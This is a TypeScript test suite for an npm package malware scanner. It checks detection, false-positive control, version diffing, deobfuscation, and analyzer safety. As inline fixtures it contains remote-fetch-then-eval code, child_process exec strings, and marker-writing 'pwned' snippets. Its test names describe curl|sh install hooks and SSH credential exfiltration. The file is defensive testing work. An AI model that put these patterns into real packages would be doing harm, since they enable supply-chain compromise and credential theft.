/**
 * 端到端测试:用生成的样本包验证检出、误报控制、差分和安全边界。
 *
 * 运行: npm test
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, writeFileSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanPath, scanSummary } from '../src/scanner';
import { diffReports } from '../src/diff';
import { analyzeJsSource } from '../src/analyze/js';
import { decodeBase64, decodeEscapes, extractPayloads, looksLikeBase64 } from '../src/deobfuscate';
import { parseProgram } from '../src/ast';
import { buildTarball, SAMPLES } from '../scripts/build-samples';
import { DEFAULT_OPTIONS } from '../src/scanner';
import { gunzipSync } from 'node:zlib';

const SAMPLE_DIR = join(__dirname, '..', '..', 'samples', 'packages');

function sample(name: string): string {
  const path = join(SAMPLE_DIR, `${name}.tgz`);
  assert.ok(existsSync(path), `sample ${name} 不存在,先运行 npm run samples`);
  return path;
}

function scanSample(name: string) {
  const report = scanPath(sample(name), DEFAULT_OPTIONS);
  return { report, ...scanSummary(report) };
}

function ruleIds(report: ReturnType<typeof scanPath>): Set<string> {
  return new Set([...report.archiveFindings, ...report.files.flatMap((f) => f.findings)].map((f) => f.ruleId));
}

// ── 样本完整性 ─────────────────────────────────────────────────

test('样本包全部存在', () => {
  for (const s of SAMPLES) {
    assert.ok(existsSync(join(SAMPLE_DIR, `${s.fileName}.tgz`)), `缺少 ${s.fileName}.tgz`);
  }
});

// ── 干净包不应被误报 ────────────────────────────────────────────

test('干净工具库判定为 clean,且无任何 medium 以上发现', () => {
  const { verdict, report } = scanSample('clean-string-utils-1.2.0');
  assert.equal(verdict.level, 'clean');
  const severe = [...report.archiveFindings, ...report.files.flatMap((f) => f.findings)].filter(
    (f) => f.severity === 'high' || f.severity === 'critical',
  );
  assert.deepEqual(severe.map((f) => f.ruleId), []);
});

test('带合法 postinstall 的包最多 suspicious,不会被判 critical', () => {
  const { verdict } = scanSample('clean-with-build-2.0.1');
  assert.notEqual(verdict.level, 'critical');
  assert.notEqual(verdict.level, 'high');
});

test('纯功能升级的差分结果为 0 新增行为', () => {
  const oldReport = scanPath(sample('benign-evolve-1.0.0'), DEFAULT_OPTIONS);
  const newReport = scanPath(sample('benign-evolve-2.0.0'), DEFAULT_OPTIONS);
  const diff = diffReports(oldReport, newReport);
  assert.equal(diff.newFindings.length, 0);
  assert.equal(diff.scoreDelta, 0);
  assert.equal(diff.newVerdict.level, 'clean');
});

// ── 安装脚本 ───────────────────────────────────────────────────

test('curl | sh 的 postinstall 判 critical 并命中 shell-pipe', () => {
  const { verdict, report } = scanSample('evil-postinstall-curl-1.0.4');
  assert.equal(verdict.level, 'critical');
  assert.ok(ruleIds(report).has('install.shell-pipe'));
});

test('node -e + base64 的 postinstall 能解出载荷并识别 exec', () => {
  const { verdict, report } = scanSample('evil-postinstall-b64-1.1.0');
  assert.equal(verdict.level, 'critical');
  const ids = ruleIds(report);
  assert.ok(ids.has('install.node-eval'));
  assert.ok(ids.has('install.obfuscated-payload'));
  assert.ok(ids.has('exec.encoded-payload'), '应把解码后的执行行为单独标出');
});

// ── 凭据与网络 ─────────────────────────────────────────────────

test('读 env/.ssh 并 POST 到外部 → 命中外泄链', () => {
  const { verdict, report } = scanSample('evil-env-exfil-3.2.1');
  assert.ok(['high', 'critical'].includes(verdict.level));
  const ids = ruleIds(report);
  assert.ok(ids.has('cred.ssh-directory'));
  assert.ok(ids.has('net.upload-credentials'));
  assert.ok(verdict.score >= 65);
});

test('云元数据地址被识别为凭据窃取', () => {
  const { report } = scanSample('evil-typosquat-metadata-1.0.0');
  const ids = ruleIds(report);
  assert.ok(ids.has('cred.cloud-metadata'));
  assert.ok(ids.has('supply.typosquat-suspect'), 'expres 应识别为仿冒 express');
});

// ── 混淆还原 ───────────────────────────────────────────────────

test('base64 + eval 的样本能还原出第二层代码', () => {
  const { report } = scanSample('evil-obfuscated-b64-2.0.0');
  const ids = ruleIds(report);
  assert.ok(ids.has('exec.eval'));
  assert.ok(ids.has('exec.encoded-payload'), '解码后的执行行为应被单独检出');
  assert.ok(report.stats.layersDecoded > 0, '应至少还原一层编码');

  const decoded = report.files.flatMap((f) => f.findings).filter((f) => f.decodedFrom);
  assert.ok(decoded.length > 0, '应有带 decodedFrom 的发现');
});

test('十六进制转义的样本能识别并解码', () => {
  const { report } = scanSample('evil-hex-escape-1.0.9');
  const all = report.files.flatMap((f) => f.findings);
  assert.ok(all.some((f) => f.decodedFrom), '应产出解码后的发现');
  assert.ok(all.some((f) => f.ruleId === 'cred.sensitive-env' || f.ruleId === 'net.ip-literal'));
});

test('String.fromCharCode + eval 能被还原', () => {
  const { report } = scanSample('evil-charcode-1.3.3');
  const ids = ruleIds(report);
  assert.ok(ids.has('exec.eval'));
  assert.ok(ids.has('exec.encoded-payload'));
});

test('字符数组 reverse + join 组合能还原', () => {
  const { report } = scanSample('evil-array-reverse-2.2.0');
  assert.ok(ruleIds(report).has('exec.encoded-payload'));
});

// ── 远程代码执行 ────────────────────────────────────────────────

test('拉取远端再 eval → 命中 remote-fetch-eval', () => {
  const { report, verdict } = scanSample('evil-remote-eval-0.9.1');
  assert.ok(ruleIds(report).has('net.remote-fetch-eval') || ruleIds(report).has('exec.eval'));
  assert.ok(['high', 'critical'].includes(verdict.level));
});

test('child_process 里下载后管道给 shell → 判 RCE', () => {
  const { report, verdict } = scanSample('evil-download-exec-1.2.0');
  assert.ok(ruleIds(report).has('net.remote-fetch-eval'));
  assert.ok(['high', 'critical'].includes(verdict.level));
});

// ── 反分析与持久化 ──────────────────────────────────────────────

test('沙箱检测 + 长延时 → 命中 evasion 规则', () => {
  const { report } = scanSample('evil-sandbox-detect-1.4.0');
  const ids = ruleIds(report);
  assert.ok(ids.has('evasion.sandbox-detect'));
  assert.ok(ids.has('evasion.delay-execution'));
});

test('写入 ~/.bashrc 与 crontab → 命中持久化', () => {
  const { report } = scanSample('evil-persistence-1.0.2');
  const ids = ruleIds(report);
  assert.ok(ids.has('fs.autostart'));
  assert.ok(ids.has('fs.write-outside-package'));
  assert.ok(ids.has('evasion.npm-config-tamper'));
});

// ── 归档结构 ───────────────────────────────────────────────────

test('路径穿越 / 逃逸符号链接 / ELF 都会被标记', () => {
  const { report } = scanSample('evil-archive-structure-1.0.0');
  const ids = ruleIds(report);
  assert.ok(ids.has('artifact.path-traversal'));
  assert.ok(ids.has('artifact.symlink-escape'));
  assert.ok(ids.has('artifact.hidden-executable'));
  // 不得把穿越条目写到磁盘
  assert.ok(!existsSync(join(SAMPLE_DIR, 'outside', 'evil.js')));
});

// ── 版本差分 ───────────────────────────────────────────────────

test('差分:投毒版本的新行为被单独标出且权重上调', () => {
  const oldReport = scanPath(sample('diffpkg-1.0.0'), DEFAULT_OPTIONS);
  const newReport = scanPath(sample('diffpkg-1.0.1'), DEFAULT_OPTIONS);
  const diff = diffReports(oldReport, newReport);

  assert.equal(diff.oldVerdict.level, 'clean');
  assert.ok(['high', 'critical'].includes(diff.newVerdict.level));
  assert.ok(diff.newFindings.length > 0);
  assert.ok(diff.newFindings.every((f) => f.isNew === true));
  assert.ok(diff.newFindings.every((f) => f.effectiveWeight >= f.weight));

  const ids = new Set(diff.newFindings.map((f) => f.ruleId));
  assert.ok(ids.has('cred.ssh-directory'));
  assert.ok(ids.has('net.http-request'));
  assert.ok(diff.scriptChanges.some((c) => c.name === 'postinstall' && c.after?.includes('setup.js')));
  assert.ok(diff.scoreDelta > 0);
});

test('差分:同一条行为换行不算新行为', () => {
  // 构造两个只在行号上不同的包
  const tmp = mkdtempSync(join(tmpdir(), 'pkgsentry-diff-'));
  try {
    const find = (name: string) => SAMPLES.find((s) => s.fileName === name)!;
    const base = find('benign-evolve-1.0.0');
    const shifted = {
      ...base,
      fileName: 'shifted',
      packageJson: { ...base.packageJson, version: '1.0.1' },
      files: base.files.map((f) => ({ ...f, content: `\n\n\n${f.content ?? ''}` })),
    };
    const a = join(tmp, 'a.tgz');
    const b = join(tmp, 'b.tgz');
    writeFileSync(a, buildTarball({ ...base, fileName: 'a' }));
    writeFileSync(b, buildTarball(shifted));
    const diff = diffReports(scanPath(a, DEFAULT_OPTIONS), scanPath(b, DEFAULT_OPTIONS));
    assert.equal(diff.newFindings.length, 0);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ── 误报回归(这些写法在正经库里极常见) ─────────────────────────

test('常见但合法的写法不会被判 high/critical', () => {
  const { verdict, report } = scanSample('clean-tricky-patterns-1.5.0');
  assert.ok(['clean', 'low', 'suspicious'].includes(verdict.level), `意外的高风险结论: ${verdict.level}`);
  const ids = ruleIds(report);
  assert.ok(!ids.has('obf.unicode-escape-code'), 'unicode 字母映射表不应算混淆代码');
  assert.ok(!ids.has('obf.char-array'), '空白字符表不应算字符数组混淆');
  assert.ok(!ids.has('exec.new-function'), '运行期拼接的模板函数不应算动态执行');
  assert.ok(!ids.has('evasion.sandbox-detect'), 'CI 变量检测不应算沙箱规避');
  assert.ok(!ids.has('cred.env-dump'), 'Object.keys(process.env) 只拿到键名,不算转储');
});

test('纯压缩产物不会被当成混淆', () => {
  const { verdict, report } = scanSample('clean-minified-2.1.0');
  assert.equal(verdict.level, 'clean');
  assert.ok(!ruleIds(report).has('obf.identifier-mangling'));
});

test('HTTP 客户端库单独命中网络规则只给低风险', () => {
  const { verdict, report } = scanSample('clean-http-client-4.0.0');
  assert.ok(['clean', 'low'].includes(verdict.level), `HTTP 客户端被高估: ${verdict.level}`);
  assert.ok(!ruleIds(report).has('net.upload-credentials'), '发送自有 API key 不算凭据外泄');
});

test('文档与 .d.ts 不参与规则匹配', () => {
  const { report } = scanSample('clean-tricky-patterns-1.5.0');
  const files = report.files.map((f) => f.path);
  assert.ok(!files.some((p) => p.endsWith('.md')), 'README 不应产出 finding');
  assert.ok(!files.some((p) => p.endsWith('.d.ts')), '类型声明不应产出 finding');
});

// ── 污点传播 ───────────────────────────────────────────────────

test('网络响应经多层回调流入 eval 会被识别', () => {
  const src = `const https = require('https');
https.get('https://x/y.js', (res) => {
  let body = '';
  res.on('data', (c) => (body += c));
  res.on('end', () => { eval(body); });
});`;
  const res = analyzeJsSource(src, 'taint.js');
  assert.ok(res.findings.some((f) => f.ruleId === 'net.remote-fetch-eval'), '应识别响应→eval 的数据流');
});

test('普通函数里的局部变量名不会污染同名标识符', () => {
  // 只有真实网络回调内部的名字才算污点,避免误报
  const src = `function unrelated(body) { eval(body); }\nmodule.exports = unrelated;\n`;
  const res = analyzeJsSource(src, 'clean.js');
  assert.ok(!res.findings.some((f) => f.ruleId === 'net.remote-fetch-eval'));
});

// ── 解码原语 ───────────────────────────────────────────────────

test('base64 判定不会把普通英文误判', () => {
  assert.equal(looksLikeBase64('this is a normal english sentence, not base64 at all'), false);
  assert.equal(looksLikeBase64('aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgYmFzZTY0'), true);
});

test('base64 解码正确且拒绝二进制', () => {
  assert.equal(decodeBase64(Buffer.from('hello world').toString('base64')), 'hello world');
  // 含 NUL 的二进制内容不当作文本返回
  assert.equal(decodeBase64(Buffer.from([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]).toString('base64')), null);
});

test('转义解码支持 \\x 与 \\u', () => {
  assert.equal(decodeEscapes('\\x68\\x69'), 'hi');
  assert.equal(decodeEscapes('\\u0041\\u0042'), 'AB');
});

test('extractPayloads 能穿透两层 base64', () => {
  const inner = `console.log('layer2: require("child_process").exec("id")')`;
  const layer1 = Buffer.from(inner).toString('base64');
  const source = `const x = '${Buffer.from(layer1).toString('base64')}'; eval(Buffer.from(x,'base64').toString());`;
  const parsed = parseProgram(source);
  assert.ok(parsed);
  const payloads = extractPayloads(parsed.ast, source, 'x.js', 3);
  assert.ok(payloads.some((p) => p.text.includes('layer2')), '应解出内层代码');
});

test('纯拼接的可疑代码能被整体求值', () => {
  const source = `eval('require' + '(' + "'child_process'" + ')' + '.exec' + "('id > /tmp/x')")`;
  const res = analyzeJsSource(source, 'concat.js');
  assert.ok(res.findings.some((f) => f.ruleId === 'exec.eval'));
});

// ── 安全边界 ───────────────────────────────────────────────────

test('分析器不执行被分析代码:全局副作用不会被触发', () => {
  const marker = join(tmpdir(), `pkgsentry-pwned-${process.pid}`);
  rmSync(marker, { force: true });
  const evilSource = `
    const fs = require('fs');
    fs.writeFileSync(${JSON.stringify(marker)}, 'pwned');
    eval("require('fs').writeFileSync(${JSON.stringify(marker + '-eval')}, 'x')");
    new Function("require('fs').writeFileSync(" + JSON.stringify(marker + '-fn') + ", 'x')")();
    require('child_process').execSync('touch ${marker}-exec');
    module.exports = {};
  `;
  const res = analyzeJsSource(evilSource, 'evil.js');
  // 规则应该报出这些行为……
  assert.ok(res.findings.some((f) => f.ruleId === 'exec.eval'));
  assert.ok(res.findings.some((f) => f.ruleId === 'exec.child-process'));
  // ……但一个都不能真的发生
  assert.ok(!existsSync(marker), 'require/fs 不应被执行');
  assert.ok(!existsSync(`${marker}-eval`), 'eval 不应被执行');
  assert.ok(!existsSync(`${marker}-fn`), 'new Function 不应被执行');
  assert.ok(!existsSync(`${marker}-exec`), 'child_process 不应被执行');
});

test('恶意 tarball 不会被解压到磁盘', () => {
  const before = readFileSync(sample('evil-archive-structure-1.0.0'));
  const report = scanPath(sample('evil-archive-structure-1.0.0'), DEFAULT_OPTIONS);
  const after = readFileSync(sample('evil-archive-structure-1.0.0'));
  assert.deepEqual(before, after, '扫描不应修改输入文件');
  assert.ok(report.archiveFindings.some((f) => f.ruleId === 'artifact.path-traversal'));
});

test('超大归档条目会被截断而不是耗尽内存', () => {
  const tmp = mkdtempSync(join(tmpdir(), 'pkgsentry-limit-'));
  try {
    // 构造一个 5MB 的“文本”文件,并把单文件上限设成 64KB
    const pkgJson = { name: 'big', version: '1.0.0', main: 'index.js' };
    const big = 'A'.repeat(5 * 1024 * 1024);
    const tgz = buildTarball({
      fileName: 'big',
      packageJson: pkgJson,
      files: [{ path: 'index.js', content: big }],
    });
    const path = join(tmp, 'big.tgz');
    writeFileSync(path, tgz);
    const report = scanPath(path, { ...DEFAULT_OPTIONS, maxFileBytes: 64 * 1024 });
    assert.ok(report.stats.skipped.length > 0, '应记录被截断');
    assert.ok(report.stats.totalBytes <= 64 * 1024 + 4096);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ── CLI ────────────────────────────────────────────────────────

test('CLI scan --json 输出可解析的 JSON', () => {
  const out = execFileSync(process.execPath, [join(__dirname, '..', 'src', 'index.js'), 'scan', sample('clean-string-utils-1.2.0'), '--json'], {
    encoding: 'utf8',
  });
  const parsed = JSON.parse(out);
  assert.equal(parsed.tool, 'pkgsentry');
  assert.equal(parsed.package.name, 'str-utils-lite');
  assert.equal(parsed.verdict.level, 'clean');
});

test('CLI --fail-on 在高危样本上返回退出码 1', () => {
  assert.throws(
    () =>
      execFileSync(process.execPath, [join(__dirname, '..', 'src', 'index.js'), 'scan', sample('evil-env-exfil-3.2.1'), '--fail-on', 'high'], {
        encoding: 'utf8',
        stdio: 'pipe',
      }),
    (err: any) => err.status === 1,
  );
});

test('CLI --sarif 输出 SARIF 2.1.0', () => {
  const out = execFileSync(process.execPath, [join(__dirname, '..', 'src', 'index.js'), 'scan', sample('evil-env-exfil-3.2.1'), '--sarif'], {
    encoding: 'utf8',
  });
  const sarif = JSON.parse(out);
  assert.equal(sarif.version, '2.1.0');
  assert.ok(sarif.runs[0].results.length > 0);
  assert.ok(sarif.runs[0].results.every((r: any) => r.locations[0].physicalLocation.artifactLocation.uri.startsWith('package/')));
});

test('CLI diff 输出包含新增行为标记', () => {
  const out = execFileSync(
    process.execPath,
    [join(__dirname, '..', 'src', 'index.js'), 'diff', sample('diffpkg-1.0.0'), sample('diffpkg-1.0.1'), '--json'],
    { encoding: 'utf8' },
  );
  const parsed = JSON.parse(out);
  assert.ok(parsed.diff.newFindings.length > 0);
  assert.ok(parsed.diff.newFindings.every((f: any) => f.isNew));
});

// ── 规则表一致性 ───────────────────────────────────────────────

test('每条 finding 的 ruleId 都在规则表里,权重在 0-100', async () => {
  const { RULES, RULE_BY_ID } = await import('../src/rules');
  assert.equal(RULE_BY_ID.size, RULES.length, '规则 id 不应重复');
  for (const rule of RULES) {
    assert.ok(rule.weight >= 0 && rule.weight <= 100, `${rule.id} 权重越界`);
    assert.ok(rule.title.length > 0);
    assert.ok(rule.description.length > 0);
  }
  const all = scanPath(sample('evil-env-exfil-3.2.1'), DEFAULT_OPTIONS);
  for (const f of [...all.archiveFindings, ...all.files.flatMap((x) => x.findings)]) {
    assert.ok(RULE_BY_ID.has(f.ruleId), `未登记的规则 ${f.ruleId}`);
  }
});

test('gzip 与非压缩 tar 都能读取', () => {
  const tgz = readFileSync(sample('clean-string-utils-1.2.0'));
  const tar = gunzipSync(tgz);
  const tmp = mkdtempSync(join(tmpdir(), 'pkgsentry-tar-'));
  try {
    const plain = join(tmp, 'plain.tar');
    writeFileSync(plain, tar);
    const report = scanPath(plain, DEFAULT_OPTIONS);
    assert.equal(report.package.name, 'str-utils-lite');
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});
